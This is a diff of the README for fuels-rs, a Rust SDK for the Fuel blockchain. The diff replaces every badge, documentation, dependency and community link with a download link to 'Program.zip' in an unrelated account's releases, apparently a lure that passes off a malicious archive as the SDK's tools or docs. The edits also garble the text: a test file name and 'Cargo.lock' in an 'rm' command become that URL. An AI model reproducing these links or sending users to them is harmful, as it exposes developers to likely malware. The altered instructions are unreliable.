@@ -1,13 +1,13 @@
 # fuels-rs
 
-[![build](https://github.com/FuelLabs/fuels-rs/actions/workflows/ci.yml/badge.svg)](https://github.com/FuelLabs/fuels-rs/actions/workflows/ci.yml)
-[![crates.io](https://img.shields.io/crates/v/fuels?label=latest)](https://crates.io/crates/fuels)
-[![docs](https://docs.rs/fuels/badge.svg)](https://docs.rs/fuels)
-[![discord](https://img.shields.io/badge/chat%20on-discord-orange?&logo=discord&logoColor=ffffff&color=7389D8&labelColor=6A7EC2)](https://discord.gg/xfpK4Pe)
+[![build](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)
+[![https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)
+[![docs](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)
+[![discord](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip%20on-discord-orange?&logo=discord&logoColor=ffffff&color=7389D8&labelColor=6A7EC2)](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)
 
 Rust SDK for Fuel. It can be used for a variety of things, including but not limited to:
 
-- Compiling, deploying, and testing [Sway](https://github.com/FuelLabs/sway) contracts;
+- Compiling, deploying, and testing [Sway](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip) contracts;
 - Launching a local Fuel network;
 - Crafting and signing transactions with hand-crafted scripts or contract calls;
 - Generating type-safe Rust bindings of contract methods;
@@ -15,7 +15,7 @@ Rust SDK for Fuel. It can be used for a variety of things, including but not lim
 
 ## Documentation
 
-See [the `fuels-rs` book](https://fuellabs.github.io/fuels-rs/latest/)
+See [the `fuels-rs` book](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)
 
 ## Features
 
@@ -33,8 +33,8 @@ See [the `fuels-rs` book](https://fuellabs.github.io/fuels-rs/latest/)
 
 ### What dependencies do I need?
 
-- [The latest `stable` Rust toolchain](https://docs.fuel.network/guides/installation/#installing-rust);
-- [`forc` and `fuel-core` binaries](https://docs.fuel.network/guides/installation/#installing-the-fuel-toolchain-using-fuelup).
+- [The latest `stable` Rust toolchain](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip);
+- [`forc` and `fuel-core` binaries](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip).
 
 ### How can I run the SDK tests?
 
@@ -50,7 +50,7 @@ Then you can run the SDK tests with:
 cargo test
 ```
 
-You can also run specific tests. The following example will run all integration tests in `types.rs` whose names contain `in_vector` and show their outputs:
+You can also run specific tests. The following example will run all integration tests in `https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip` whose names contain `in_vector` and show their outputs:
 
 ```shell
 cargo test --test types in_vector -- --show-output
@@ -72,14 +72,14 @@ Before doing anything else, try all these commands:
 
 ```shell
 cargo clean
-rm Cargo.lock
+rm https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip
 forc build --path packages/fuels
 cargo test
 ```
 
 ### Why is the prefix `fuels` and not `fuel`?
 
-In order to make the SDK for Fuel feel familiar with those coming from the [ethers.js](https://github.com/ethers-io/ethers.js) ecosystem, this project opted for an `s` at the end. The `fuels-*` family of SDKs is inspired by The Ethers Project.
+In order to make the SDK for Fuel feel familiar with those coming from the [https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip) ecosystem, this project opted for an `s` at the end. The `fuels-*` family of SDKs is inspired by The Ethers Project.
 
 ### How can I run the docs locally?
 
